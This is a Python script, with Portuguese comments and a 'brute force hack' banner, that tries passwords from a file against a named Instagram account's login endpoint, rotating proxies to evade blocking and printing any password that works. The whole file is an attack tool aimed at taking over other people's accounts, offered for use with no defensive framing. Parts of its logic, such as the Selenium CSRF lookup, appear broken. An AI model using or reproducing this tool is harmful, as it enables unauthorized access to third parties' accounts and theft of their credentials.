import requests
import json
import time
import os
import random
import sys
from selenium import webdriver

# Função de ajuda
def Input(text):
    value = ''
    if sys.version_info.major > 2:
        value = input(text)
    else:
        value = raw_input(text)
    return str(value)

# A classe principal
class Instabrute():
    def __init__(self, username, passwordsFile='password.txt'):
        self.username = username
        self.CurrentProxy = ''
        self.UsedProxys = []
        self.passwordsFile = passwordsFile

        # Verifica se o arquivo de senhas existe
        self.loadPasswords()
        # Verifica se o nome de usuário existe
        self.IsUserExists()

        UseProxy = Input('[*] Você deseja usar um proxy (s/n): ').upper()
        if UseProxy == 'S' or UseProxy == 'SIM':
            self.randomProxy()

    # Verifica se o arquivo de senhas existe e se contém senhas
    def loadPasswords(self):
        if os.path.isfile(self.passwordsFile):
            with open(self.passwordsFile) as f:
                self.passwords = f.read().splitlines()
                passwordsNumber = len(self.passwords)
                if passwordsNumber > 0:
                    print('[*] %s senhas carregadas com sucesso' % passwordsNumber)
                else:
                    print('O arquivo de senhas está vazio. Por favor, adicione senhas a ele.')
                    Input('[*] Pressione Enter para sair')
                    exit()
        else:
            print('Por favor, crie um arquivo de senhas com o nome "%s"' % self.passwordsFile)
            Input('[*] Pressione Enter para sair')
            exit()

    # Escolhe um proxy aleatório de uma lista de proxies
    def randomProxy(self):
        plist = open('proxylist.txt').read().splitlines()
        proxy = random.choice(plist)

        if proxy not in self.UsedProxys:
            self.CurrentProxy = proxy
            self.UsedProxys.append(proxy)
        try:
            print('')
            print('[*] Verificando novo IP...')
            print('[*] Seu IP público: %s' % requests.get('http://myexternalip.com/raw', proxies={"http": proxy, "https": proxy}, timeout=10.0).text)
        except Exception as e:
            print('[*] Não foi possível alcançar o proxy "%s"' % proxy)
        print('')

    # Verifica se o nome de usuário existe no servidor do Instagram
    def IsUserExists(self):
        r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username)
        if r.status_code == 404:
            print('[*] Usuário com o nome "%s" não encontrado' % self.username)
            Input('[*] Pressione Enter para sair')
            exit()
        elif r.status_code == 200:
            return True

    # Tenta fazer login com uma senha
    def Login(self, password):
        sess = requests.Session()

        if len(self.CurrentProxy) > 0:
            sess.proxies = {"http": self.CurrentProxy, "https": self.CurrentProxy}

        # Constrói os cabeçalhos da solicitação
        sess.cookies.update({'sessionid': '', 'mid': '', 'ig_pr': '1', 'ig_vw': '1920', 'csrftoken': '', 's_network': '', 'ds_user_id': ''})
        sess.headers.update({
            'UserAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
            'x-instagram-ajax': '1',
            'X-Requested-With': 'XMLHttpRequest',
            'origin': 'https://www.instagram.com',
            'ContentType': 'application/x-www-form-urlencoded',
            'Connection': 'keep-alive',
            'Accept': '*/*',
            'Referer': 'https://www.instagram.com',
            'authority': 'www.instagram.com',
            'Host': 'www.instagram.com',
            'Accept-Language': 'en-US;q=0.6,en;q=0.4',
            'Accept-Encoding': 'gzip, deflate'
        })

        # Inicializa o WebDriver do Selenium
        browser = webdriver.Chrome()

        # Abre o site do Instagram
        browser.get('https://www.instagram.com')

        # Obtenha o token CSRF automaticamente
        csrf_token = browser.execute_script("return document.querySelector('input[name=\"csrf_token\"]').value")

        # Atualiza os cabeçalhos da sessão com o token CSRF
        sess.headers.update({'X-CSRFToken': csrf_token})

        # Atualiza o token após entrar no site
        r = sess.get('https://www.instagram.com/')
        sess.headers.update({'X-CSRFToken': r.cookies.get_dict()['csrftoken']})

        # Atualiza o token após o login no site
        r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username': self.username, 'password': password}, allow_redirects=True)
        sess.headers.update({'X-CSRFToken': r.cookies.get_dict()['csrftoken']})

        # Analisa a resposta
        data = json.loads(r.text)

        if data['status'] == 'fail':
            print(data['message'])

            UseProxy = Input('[*] Você deseja usar um proxy (s/n): ').upper()
            if UseProxy == 'S' or UseProxy == 'SIM':
              print('[$] Tentando usar um proxy após a falha.')
              self.randomProxy()  # Verifique isso, pode conter erros
              return False

        # Retorna a sessão se a senha estiver correta
        if data['authenticated'] == True:
            return sess
        else:
            return False

# Início do programa
print("""\033[32;1m
   mm.           dM8
   YMMMb.       dMM8
    YMMMMb     dMMM'
     YMMMb   dMMMP
       YMMM  MMM'
          MbdMP
      .dMMMMMM.P   -=[INSTAGRAM BRUTE FORCE HACK]=-
     dMM  MMMMMMM  -=[Wrench]=-
     8MMMMMMMMMMI  -=[DEDSEC]=-
      YMMMMMMMMM   -=[INSTAGRAM: jeanpseven]=-
        MMMMMMP
       MxM .mmm

""")

print("""\033[31;1m
 /$$$$$$$  /$$$$$$$$ /$$$$$$$   /$$$$$$  /$$$$$$$$  /$$$$$$ 
| $$__  $$| $$_____/| $$__  $$ /$$__  $$| $$_____/ /$$__  $$
| $$  \ $$| $$      | $$  \ $$| $$  \__/| $$      | $$  \__/
| $$  | $$| $$$$$   | $$  | $$|  $$$$$$ | $$$$$   | $$      
| $$  | $$| $$__/   | $$  | $$ \____  $$| $$__/   | $$      
| $$  | $$| $$      | $$  | $$ /$$  \ $$| $$      | $$    $$
| $$$$$$$/| $$$$$$$$| $$$$$$$/|  $$$$$$/| $$$$$$$$|  $$$$$$/
|_______/ |________/|_______/  \______/ |________/ \______/ 
""")

instabrute = Instabrute(Input('\033[32;1mPor favor, insira um nome de usuário: '))

try:
    delayLoop = int(Input('\033[36;1m[*] Por favor, adicione um atraso entre as ações de força bruta (em segundos): ')) 
except Exception as e:
    print('[*] Erro, o software usará o valor padrão "4"')
    delayLoop = 4
print('')

for password in instabrute.passwords:
    sess = instabrute.Login(password)
    if sess:
        print('[*] Login bem-sucedido %s' % [instabrute.username, password])
    else:
        print('[*] Senha incorreta [%s]' % password)

    try:
        time.sleep(delayLoop)
    except KeyboardInterrupt:
        WantToExit = str(Input('Digite s/n para sair: ')).upper()
        if WantToExit == 'S' or WantToExit == 'SIM':
            exit()
        else:
            continue
